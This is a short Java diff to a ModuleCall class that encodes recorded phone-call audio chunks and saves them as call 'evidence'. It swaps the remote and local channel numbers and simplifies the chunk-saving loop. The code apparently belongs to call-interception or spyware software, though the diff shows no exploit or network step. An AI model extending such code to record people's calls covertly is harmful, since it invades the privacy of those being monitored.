@@ -951,7 +951,7 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 				sort_chunks();
 			} else {
 				// Encode to evidence
-				int channel = remote ? 1 : 0;
+				int channel = remote ? 0 : 1;
 
 				if (!started) {
 					if (remote) {
@@ -1044,25 +1044,8 @@ public class ModuleCall extends BaseModule implements Observer<Call> {
 		boolean started = false;
 
 		for (Chunk chunk : chunks) {
-			if (!started) {
-				if (chunk.remote) {
-					lastr = chunk;
-				} else {
-					started = true;
-				}
-
-				saveCallEvidence(caller, callee, true, lastr.begin, lastr.end, lastr.encodedFile, false, lastr.channel,
-						callInfo.programId);
-				saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.channel,
-						callInfo.programId);
-			} else {
-
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (saveAllEvidences) saving chunk: " + chunk.encodedFile);
-				}
-				saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.channel,
-						callInfo.programId);
-			}
+			saveCallEvidence(caller, callee, true, chunk.begin, chunk.end, chunk.encodedFile, false, chunk.channel,
+					callInfo.programId);
 
 		}
 
